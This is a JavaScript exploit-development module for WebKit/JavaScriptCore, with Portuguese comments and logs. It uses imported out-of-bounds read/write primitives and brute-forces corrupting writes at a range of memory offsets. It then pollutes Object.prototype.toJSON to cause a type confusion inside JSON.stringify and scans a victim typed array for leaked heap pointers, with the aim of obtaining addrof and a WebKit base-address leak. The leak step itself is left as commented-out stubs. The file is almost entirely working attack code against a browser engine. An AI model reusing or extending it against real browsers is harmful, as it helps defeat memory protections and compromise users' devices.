// js/script3/testArrayBufferVictimCrash.mjs (R43L - Testes Massivos Finais - Correção Escopo)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    clearOOBEnvironment,
    arb_read,
    oob_write_absolute,
    isOOBReady,
    selfTestOOBReadWrite,
} from '../core_exploit.mjs';
import { JSC_OFFSETS } from '../config.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "OriginalHeisenbug_TypedArrayAddrof_v82_AGL_R43_MassiveFinalScopeFix";

const VICTIM_TA_SIZE_ELEMENTS = 16;
const VICTIM_TA_BUFFER_SIZE_BYTES = VICTIM_TA_SIZE_ELEMENTS * 4;

const OOB_OFFSETS_TO_TEST_FINAL = [0x6C, 0x70, 0x74, 0x78, 0x7C, 0x80, 0x84, 0x88, 0x8C, 0x90];
const OOB_VALUES_TO_TEST_FINAL = [
    0xABABABAB, 0xCDCDCDCD, 0xFFFFFFFF, 0x00000000, 0x41414141,
    (JSC_OFFSETS.ArrayBuffer.KnownStructureIDs.ArrayBuffer_STRUCTURE_ID || 0xDEF00002),
];

const FILL_PATTERN_VICTIM_TA_FINAL = 0xBADF00D5;
const PROBE_CALL_LIMIT_V82 = 10;

const FUNCTION_OFFSET_TO_EXECUTABLE_INSTANCE = new AdvancedInt64(JSC_OFFSETS.JSFunction.EXECUTABLE_OFFSET);
const ASSUMED_EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM_VAL = 0x8;
const EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM = new AdvancedInt64(ASSUMED_EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM_VAL);

let global_target_function_for_webkit_leak;
let leaked_m2_or_target_addr_GLOBAL = null; // Endereço que persiste entre iterações se encontrado
let global_addrof_obtained_flag = false;
let global_webkit_leak_obtained_flag = false;

// ... (isValidPointer, safeToHex, logTypedArrayShort - sem alterações)
function isValidPointer(ptr, context = "") { if (!isAdvancedInt64Object(ptr)) { logS3(`[isValidPointer-${context}] Input não é AdvInt64: ${String(ptr)}`, "debug_detail"); return false; } const high = ptr.high(); const low = ptr.low(); if (high === 0 && low === 0) { logS3(`[isValidPointer-${context}] NULO: ${ptr.toString(true)}`, "debug_detail"); return false; } if (high === 0x7FF80000 && low === 0x0) { logS3(`[isValidPointer-${context}] NaN Específico: ${ptr.toString(true)}`, "debug_detail"); return false; } if ((high & 0x7FF00000) === 0x7FF00000 && ((high & 0x000FFFFF) !== 0 || low !== 0)) { logS3(`[isValidPointer-${context}] NaN Genérico: ${ptr.toString(true)}`, "debug_detail"); return false; } if (high === 0 && low < 0x10000) { logS3(`[isValidPointer-${context}] Ponteiro Baixo: ${ptr.toString(true)}`, "debug_detail"); return false; } return true;}
function safeToHex(value, length = 8) { if (typeof value === 'number') { return '0x' + (value >>> 0).toString(16).padStart(length, '0'); } if (value === null || value === undefined) { return String(value); } try { return toHex(value); } catch (e) { return String(value); }}
function logTypedArrayShort(ta, name = "TypedArray", max = 8) { if (!ta || typeof ta.slice !== 'function') { return "N/A"; } const content = Array.from(ta.slice(0, Math.min(ta.length, max))).map(v => safeToHex(v)); return `${name}[${content.join(", ")}${ta.length > max ? "..." : ""}] (len:${ta.length}, byteLen:${ta.byteLength})`;}


export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Testes Massivos Finais (Escopo Corrigido) ---`, "test", FNAME_CURRENT_TEST_BASE);
    document.title = `${FNAME_CURRENT_TEST_BASE} Init MassiveScopeFix...`;

    global_target_function_for_webkit_leak = function someUniqueLeakFunctionR43L_MassiveScopeFix() { /* ... */ };
    leaked_m2_or_target_addr_GLOBAL = null; // Resetar o endereço global
    global_addrof_obtained_flag = false;   // Resetar flag global
    global_webkit_leak_obtained_flag = false; // Resetar flag global
    
    let final_probe_call_count_for_report = 0;

    logS3(`--- Fase 0 (MassiveScopeFix): Sanity Checks ---`, "subtest", FNAME_CURRENT_TEST_BASE);
    let coreOOBReadWriteOK = false;
    try { coreOOBReadWriteOK = await selfTestOOBReadWrite(logS3, safeToHex); }
    catch (e_sanity) { logS3(`Erro Sanity: ${e_sanity.message}`, "critical"); coreOOBReadWriteOK = false; }
    logS3(`Sanity Check: ${coreOOBReadWriteOK ? 'SUCESSO' : 'FALHA'}`, coreOOBReadWriteOK ? 'good' : 'critical');
    await PAUSE_S3(100);

    if (!coreOOBReadWriteOK) { /* ... (retorno de erro) ... */ }

    let iteration_results_summary = [];
    let best_result_overall = { /* ... (estrutura como antes) ... */
        errorOccurred: null, tc_probe_details: null, stringifyResultSonda: null,
        addrof_result: { success: false, msg: "Addrof (MassiveScopeFix): Não obtido.", leaked_object_addr: null },
        webkit_leak_result: { success: false, msg: "WebKit Leak (MassiveScopeFix): Não obtido.", webkit_base_candidate: null },
        oob_params_of_best_result: null,
        heisenbug_on_M2_confirmed_by_tc_probe: false, // Reflete o melhor resultado
        best_victim_analysis: null,
        total_probe_calls_last_iter: 0 // Adicionado para o runner
    };
    
    for (const current_oob_offset of OOB_OFFSETS_TO_TEST_FINAL) {
        if (global_addrof_obtained_flag && global_webkit_leak_obtained_flag) break; 

        for (const current_oob_value of OOB_VALUES_TO_TEST_FINAL) {
            if (global_addrof_obtained_flag && global_webkit_leak_obtained_flag) break;
            if (current_oob_value === null || current_oob_value === undefined) continue;

            // CORRIGIDO: Flags de sucesso da iteração declaradas aqui
            let addrof_success_this_iter_flag = false;
            let arb_rw_via_victim_ta_this_iter_flag = false;
            let webkit_leak_success_this_iter_flag = false; // Para WebKitLeak específico da iteração
            let leaked_addr_this_iter = null; // Endereço vazado nesta iteração

            const current_oob_hex_val = safeToHex(current_oob_value);
            const current_offset_hex = safeToHex(current_oob_offset);
            const FNAME_CURRENT_ITERATION = `${FNAME_CURRENT_TEST_BASE}_Off${current_offset_hex}_Val${current_oob_hex_val}`;

            logS3(`\n===== ITERATION MassiveScopeFix: Offset OOB: ${current_offset_hex}, Valor OOB: ${current_oob_hex_val} =====`, "subtest", FNAME_CURRENT_ITERATION);
            document.title = `${FNAME_CURRENT_TEST_BASE} Off:${current_offset_hex} Val:${current_oob_hex_val}`;

            let victim_ta_for_json_trigger = null;
            let iter_victim_analysis = { /* ... (estrutura como antes) ... */
                 offset_tested: current_offset_hex, value_written: current_oob_hex_val, notes: "",
                 found_pointers_in_victim_ta: [], addrof_achieved_via_victim_corruption: false
            };

            let probe_call_count_iter = 0;
            let m1_ref = null; let m2_ref = null;
            let tc_detected_this_iter = false;
            let tc_details_this_iter = null;

            function massive_final_scopefix_probe_toJSON() {
                probe_call_count_iter++; const call_num = probe_call_count_iter;
                const ctts = Object.prototype.toString.call(this);
                const is_m2c = (this === m2_ref && m2_ref !== null);

                try {
                    if (call_num > PROBE_CALL_LIMIT_V82) return { r_stop: "limit" };
                    if (call_num === 1 && this === victim_ta_for_json_trigger) {
                        m2_ref = { id: "M2_MassiveScopeFix", target_function_prop: global_target_function_for_webkit_leak };
                        m1_ref = { id: "M1_MassiveScopeFix", m2: m2_ref };
                        logS3(`[PROBE_MassiveScopeFix] Call #${call_num}: 'this' é victim_ta_for_json_trigger. M1/M2 criados.`, "debug_detail");
                        
                        logS3(`   [PROBE_MassiveScopeFix] Analisando victim_ta_for_json_trigger (após OOB e M1/M2 alloc):`, "info_emphasis");
                        for (let i = 0; i < victim_ta_for_json_trigger.length - 1; i += 2) {
                            const low = victim_ta_for_json_trigger[i];
                            const high = victim_ta_for_json_trigger[i+1];
                            if (low !== FILL_PATTERN_VICTIM_TA_FINAL || high !== FILL_PATTERN_VICTIM_TA_FINAL) {
                                let potential_ptr = new AdvancedInt64(low, high);
                                logS3(`     victim_ta[${i}/${i+1}]: L=${safeToHex(low)}, H=${safeToHex(high)} -> ${potential_ptr.toString(true)}`, "leak");
                                if (isValidPointer(potential_ptr, "_victimCorruptionCheck")) {
                                    logS3(`       !!! PONTEIRO VÁLIDO em victim_ta[${i}/${i+1}]: ${potential_ptr.toString(true)} !!!`, "success_major");
                                    iter_victim_analysis.found_pointers_in_victim_ta.push({index: i, low: low, high: high, addr_str: potential_ptr.toString(true)});
                                    if (!leaked_addr_this_iter) { // Pegar o primeiro ponteiro válido como candidato
                                        leaked_addr_this_iter = potential_ptr;
                                        iter_victim_analysis.addrof_achieved_via_victim_corruption = true;
                                        addrof_success_this_iter_flag = true; // Sinalizar sucesso nesta iteração
                                        iter_victim_analysis.notes += `Addrof putativo via victim_ta[${i}]: ${potential_ptr.toString(true)}. `;
                                    }
                                }
                            }
                        }
                        if (!addrof_success_this_iter_flag) {
                            logS3(`   [PROBE_MassiveScopeFix] Nenhum ponteiro válido óbvio encontrado em victim_ta.`, "info");
                        }
                        return m1_ref;
                    } else if (is_m2c) {
                        if (!tc_detected_this_iter) {
                            tc_detected_this_iter = true;
                            tc_details_this_iter = { call_number_tc_detected: call_num, probe_variant: "MassiveScopeFixProbe", this_type_actual: ctts, this_is_M2: true, notes: "TC Confirmada."};
                            logS3(`[PROBE_MassiveScopeFix] Call #${call_num} (M2C): FIRST TC. 'this' é M2 (id: ${this.id}).`, "vuln");
                        }
                        return this;
                    }
                } catch (e_pm) { console.error("[PROBE_MassiveScopeFix] Erro:", e_pm); tc_details_this_iter = {error_probe: `ProbeMainErr:${e_pm.message}`}; }
                return { gen_m: call_num, type: ctts };
            }

            let iter_primary_error = null;
            let stringify_output_raw_iter = null; // Variável local para o output do stringify da iteração

            try {
                victim_ta_for_json_trigger = new Uint32Array(VICTIM_TA_SIZE_ELEMENTS);
                victim_ta_for_json_trigger.fill(FILL_PATTERN_VICTIM_TA_FINAL);
                logS3(`   Victim Uint32Array (victim_ta_for_json_trigger) criado e preenchido com padrão ${safeToHex(FILL_PATTERN_VICTIM_TA_FINAL)}.`, 'info');

                await triggerOOB_primitive({ force_reinit: true, caller_fname: `${FNAME_CURRENT_ITERATION}-OOBSetup` });
                oob_write_absolute(current_oob_offset, current_oob_value, 4);
                logS3(`   OOB Write: ${current_oob_hex_val} @ ${current_offset_hex}`, 'info');
                await PAUSE_S3(150);

                const ppKey = 'toJSON'; let origDesc = Object.getOwnPropertyDescriptor(Object.prototype, ppKey); let polluted = false;
                try {
                    Object.defineProperty(Object.prototype, ppKey, { value: massive_final_scopefix_probe_toJSON, writable: true, configurable: true, enumerable: false });
                    polluted = true;
                    stringify_output_raw_iter = JSON.stringify(victim_ta_for_json_trigger); 
                    logS3(`   JSON.stringify output: ${stringify_output_raw_iter ? stringify_output_raw_iter.substring(0,100) : "null" }...`, "debug_detail");
                    if (tc_detected_this_iter) logS3(`  TC Probe (MassiveScopeFix): TC CONFIRMADA.`, "vuln");
                    else logS3(`  TC Probe (MassiveScopeFix): TC NÃO Confirmada.`, "warn");
                } catch (e_str) { iter_primary_error = e_str; logS3(`  JSON.stringify EXCEPTION: ${e_str.message}`, "error"); }
                finally { if (polluted) { if (origDesc) Object.defineProperty(Object.prototype, ppKey, origDesc); else delete Object.prototype[ppKey]; } }

                // WebKitLeak SE addrof_success_this_iter_flag for true E leaked_addr_this_iter for válido
                if (addrof_success_this_iter_flag && leaked_addr_this_iter) {
                    global_addrof_obtained_flag = true; // Sinalizar sucesso global do addrof
                    leaked_m2_or_target_addr_GLOBAL = leaked_addr_this_iter; // Salvar globalmente o primeiro addrof bem sucedido

                    logS3(`  ADDROF OBTIDO NESTA ITERAÇÃO: ${leaked_addr_this_iter.toString(true)}! Tentando WebKitLeak...`, "success_major");
                    // A lógica de WebKitLeak precisa do endereço de uma JSFunction.
                    // leaked_addr_this_iter é o endereço putativo de M2.
                    // Precisamos ler m2_ref.target_function_prop de M2.
                    // Isto requer saber o offset da propriedade 'target_function_prop' dentro de M2.
                    // Offset de propriedade em JSObject é complexo (butterfly, etc.).
                    // SOLUÇÃO PROVISÓRIA: Usar global_target_function_for_webkit_leak e assumir que o exploit
                    // idealmente nos daria o endereço DESTA função. Por agora, se addrof de M2 foi obtido,
                    // não podemos prosseguir para WebKitLeak sem mais informações ou uma forma de addrof(global_target_function_for_webkit_leak).
                    logS3(`    WebKitLeak: Addrof(M2) = ${leaked_addr_this_iter.toString(true)}. Para WebKitLeak, precisamos addrof(target_function).`, "info_emphasis");
                    // best_result_overall.webkit_leak_result = { success: false, msg: "Addrof de M2 obtido, mas addrof da função alvo ainda é necessário para WebKitLeak."};

                    // Se por um acaso MUITO grande, leaked_addr_this_iter fosse o da função alvo (altamente improvável com esta técnica)
                    let addr_to_use_for_wk_leak = null;
                    if (m2_ref && m2_ref.target_function_prop === global_target_function_for_webkit_leak) {
                         // Se o addrof foi de M2, e M2 tem a função, precisamos ler o ponteiro da propriedade.
                         // Esta é a parte que falta: como ler m2_ref.target_function_prop usando leaked_addr_this_iter (addrof(M2)).
                         // Por agora, vamos pular o WebKitLeak se só temos addrof(M2).
                         // A menos que o ponteiro vazado seja magicamente o da função.
                         // Vamos verificar se o leaked_addr_this_iter é parecido com um código/função (ex: alinhamento, região)
                         // Isto é uma heurística muito fraca.
                         // if (leaked_addr_this_iter.low() % 8 === 0 && leaked_addr_this_iter.high() < 0x10) { // Exemplo de heurística
                         //    addr_to_use_for_wk_leak = leaked_addr_this_iter;
                         // }
                         logS3(`    WebKitLeak: Addrof de M2 obtido. Para vazar base do WebKit, precisaríamos do endereço de global_target_function_for_webkit_leak. Tentativa de WebKitLeak pulada por ora.`, "warn");
                    }


                    // if (addr_to_use_for_wk_leak && arb_read) { // Se tivermos um candidato para o endereço da função
                    //     // ... Colar lógica de WebKitLeak aqui usando addr_to_use_for_wk_leak ...
                    //     // Se bem sucedido: global_webkit_leak_obtained_flag = true;
                    //     // webkit_leak_success_this_iter_flag = true;
                    //     // best_result_overall.webkit_leak_result = { success: true, ... };
                    // }
                }


            } catch (e_outer_iter) { iter_primary_error = e_outer_iter; }
            finally { await clearOOBEnvironment({ caller_fname: `${FNAME_CURRENT_ITERATION}-FinalClear` }); }

            final_probe_call_count_for_report = probe_call_count_iter;
            let current_iter_summary = { /* ... (como antes, populando addrof_success_this_iter, etc.) ... */
                oob_offset: current_offset_hex, oob_value: current_oob_hex_val,
                raw_oob_offset: current_oob_offset, raw_oob_value: current_oob_value,
                error: iter_primary_error ? (iter_primary_error.message || String(iter_primary_error)) : null,
                tc_probe_details: tc_details_this_iter,
                victim_ta_analysis: iter_victim_analysis, // Mudar nome do campo se necessário
                addrof_success_this_iter: addrof_success_this_iter_flag,
                webkit_leak_success_this_iter: webkit_leak_success_this_iter_flag,
                heisenbug_on_M2_confirmed_by_tc_probe: tc_detected_this_iter
            };
            iteration_results_summary.push(current_iter_summary);

            // Lógica para atualizar best_result_overall (priorizar WebKitLeak > Addrof > TC)
            if (current_iter_summary.error === null) {
                let current_is_better = false;
                if (best_result_overall.oob_params_of_best_result === null) current_is_better = true;
                else {
                    if (current_iter_summary.webkit_leak_success_this_iter && !best_result_overall.webkit_leak_result.success) current_is_better = true;
                    else if (current_iter_summary.webkit_leak_success_this_iter === best_result_overall.webkit_leak_result.success) {
                        if (current_iter_summary.addrof_success_this_iter && !best_result_overall.addrof_result.success) current_is_better = true;
                        else if (current_iter_summary.addrof_success_this_iter === best_result_overall.addrof_result.success) {
                            if (current_iter_summary.heisenbug_on_M2_confirmed_by_tc_probe && !best_result_overall.heisenbug_on_M2_confirmed_by_tc_probe) current_is_better = true;
                        }
                    }
                }
                if (current_is_better) { /* ... (atualizar best_result_overall como antes) ... */
                    best_result_overall.errorOccurred = null;
                    best_result_overall.tc_probe_details = current_iter_summary.tc_probe_details;
                    best_result_overall.addrof_result.success = current_iter_summary.addrof_success_this_iter;
                    if(current_iter_summary.addrof_success_this_iter && leaked_addr_this_iter) {
                        best_result_overall.addrof_result.leaked_object_addr = leaked_addr_this_iter.toString(true);
                        best_result_overall.addrof_result.msg = `Addrof obtido: ${leaked_addr_this_iter.toString(true)}`;
                    } else if (!current_iter_summary.addrof_success_this_iter) {
                        best_result_overall.addrof_result.msg = "Addrof (MassiveScopeFix): Não obtido no melhor resultado.";
                        best_result_overall.addrof_result.leaked_object_addr = null;
                    }
                    // WebKit leak result já é atualizado globalmente se bem sucedido e será copiado se esta for a melhor iteração geral
                    if (current_iter_summary.webkit_leak_success_this_iter) {
                        // A lógica de WebKitLeak no loop já deve ter atualizado best_result_overall.webkit_leak_result
                    }

                    best_result_overall.oob_params_of_best_result = { offset: current_offset_hex, value: current_oob_hex_val, raw_offset: current_oob_offset, raw_value: current_oob_value };
                    best_result_overall.heisenbug_on_M2_confirmed_by_tc_probe = current_iter_summary.heisenbug_on_M2_confirmed_by_tc_probe;
                    best_result_overall.best_victim_analysis = current_iter_summary.victim_ta_analysis;
                    logS3(`*** NOVO MELHOR RESULTADO: Off ${current_offset_hex} Val ${current_oob_hex_val} (Addrof:${current_iter_summary.addrof_success_this_iter}, TC:${current_iter_summary.heisenbug_on_M2_confirmed_by_tc_probe}) ***`, "success_major");
                }
            }
            document.title = `${FNAME_CURRENT_TEST_BASE} Off:${current_offset_hex} Val:${current_oob_hex_val} TC:${tc_detected_this_iter} Addr:${addrof_success_this_iter_flag}`;
            await PAUSE_S3(50);
        }
        if (global_addrof_obtained_flag && global_webkit_leak_obtained_flag) break;
        await PAUSE_S3(100);
    }

    best_result_overall.total_probe_calls_last_iter = final_probe_call_count_for_report;
    best_result_overall.iteration_results_summary = iteration_results_summary;
    best_result_overall.oob_value_of_best_result = best_result_overall.oob_params_of_best_result ? `${best_result_overall.oob_params_of_best_result.offset}_${best_result_overall.oob_params_of_best_result.value}` : "N/A";

    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Completed ---`, "test", FNAME_CURRENT_TEST_BASE);
    logS3(`Final best_result_overall (Massive Test ScopeFix): ${JSON.stringify(best_result_overall, null, 2)}`, "debug", FNAME_CURRENT_TEST_BASE);
    
    let final_title = `${FNAME_CURRENT_TEST_BASE} Final: `;
    if(best_result_overall.webkit_leak_result.success) final_title += "WEBKITLEAK_OK! ";
    else if(best_result_overall.addrof_result.success) final_title += "ADDROF_OK! ";
    else if(best_result_overall.heisenbug_on_M2_confirmed_by_tc_probe) final_title += "TC_OK ";
    if(final_title === `${FNAME_CURRENT_TEST_BASE} Final: `) final_title += "NoMajorSuccess";
    document.title = final_title.trim();

    return best_result_overall;
}
